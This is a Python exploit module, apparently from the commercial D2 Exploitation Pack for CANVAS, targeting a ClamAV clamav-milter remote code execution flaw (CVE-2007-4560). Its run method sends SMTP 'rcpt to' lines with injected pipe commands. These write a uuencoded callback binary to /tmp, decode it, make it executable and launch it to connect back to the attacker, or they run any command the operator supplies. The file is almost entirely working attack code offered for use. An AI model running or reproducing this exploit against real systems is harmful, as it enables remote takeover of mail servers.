#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2008
#

import sys, time

sys.path.append(".")
sys.path.append("../../")

import canvasengine

from MOSDEF import mosdef as mosdef
from exploitutils import *
from tcpexploit import tcpexploit
from canvasengine import LINUXMOSDEF

NAME = "ClamAV Remote Code Execution"
VERSION = "0.1"
DESCRIPTION = "ClamAV Popen Function Remote Code Execution Vulnerability"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386"] ]

NOTES = """
Tested with clamav 0.91.1.

Clamav-milter must be run in black hole mode.
"""

DOCUMENTATION = {}
DOCUMENTATION["Notes"] = NOTES
DOCUMENTATION["VersionsAffected"] = "prior 0.91.2"
DOCUMENTATION["Date public"] = "08/27/2008"
DOCUMENTATION["CVE Name"] = "CVE-2007-4560"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4560"

class theexploit (tcpexploit):
    
	def __init__(self):
		tcpexploit.__init__(self)
		self.host = ""
		self.port = 25
		self.cbackport = "5555"
		self.name = NAME
		self.mosdef = 0
		self.cmd = ""
		self.callback = ""
		return
    
	def neededListenerTypes(self):
		return [canvasengine.LINUXMOSDEF]

	def run(self):
		self.host = self.target.interface
		self.port = int(self.argsDict.get("port",self.port))
		self.mosdef = int(self.argsDict.get("mosdef",self.mosdef))
		self.cmd = self.argsDict.get("cmd",self.cmd)
		
		if self.mosdef:
			interface = self.engine.get_callback_interface()

		if self.mosdef and self.cmd:
			self.log("[D2 LOG] Choose between MOSDEF and a command")
			self.setInfo("[D2 LOG] %s attacking %s:%d - failed"%(NAME,self.host,self.port))
			return 0

		self.log("[D2 LOG] Connecting to %s:%d"%(self.host,self.port))
		s = self.gettcpsock()
		try:
			s.connect((self.host, self.port))
		except:
			self.log("[D2 LOG] Could not connect to %s on port %d" % (self.host, self.port))
			return 0

		f = open("%s/3rdparty/D2SEC/exploits/d2sec_clamav/mosdef_callback_linux_i386.uu" % os.getcwd(), "r")
		self.callback = f.read()
		f.close()

		s.send("ehlo you\r\n")
		s.send("mail from: <>\r\n")
		self.log(s.recv(4096))

		if self.mosdef:
			self.callback = self.callback.split("\n")
			for c in self.callback:
				s.send("rcpt to: nobody+\"|echo '%s'>>/tmp/.m.uu\"\r\n" % c)
				self.log("[D2 LOG] " + s.recv(4096))
			s.send("rcpt to: nobody+\"|uudecode -o /tmp/.m /tmp/.m.uu\"\r\n")
			s.send("rcpt to: nobody+\"|chmod +x /tmp/.m\"\r\n")
			s.send("rcpt to: nobody+\"|/tmp/.m %s %s\"\r\n" % (interface, self.cbackport))
			self.log("[D2 LOG] " + s.recv(4096))
		else:
			if self.cmd:
				s.send("rcpt to: nobody+\"|" + self.cmd + "\"\r\n")
				self.log("[D2 LOG] " + s.recv(4096))
			else:
				self.log("[D2 LOG] Specify a command to run")
				self.setInfo("[D2 LOG] %s attacking %s:%d - failed"%(NAME,self.host,self.port))
				return 0

		s.send("data\r\n.\r\nquit\r\n")

		if self.mosdef:
			self.log("[D2 LOG] Waiting a moment ...")
			time.sleep(120)

		self.log("[D2 LOG] " + s.recv(4096))

		self.log("[D2 LOG] Done with exploit")
		self.setInfo("[D2 LOG] %s attacking %s:%d - done"%(NAME,self.host,self.port))
		return 1

	def usage(self):
		print "Usage: "+sys.argv[0]+" -t target [-p port:25] -O mosdef:[0|1] -O cmd:[command]"
		sys.exit(0)
    
if __name__ == '__main__':
	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)
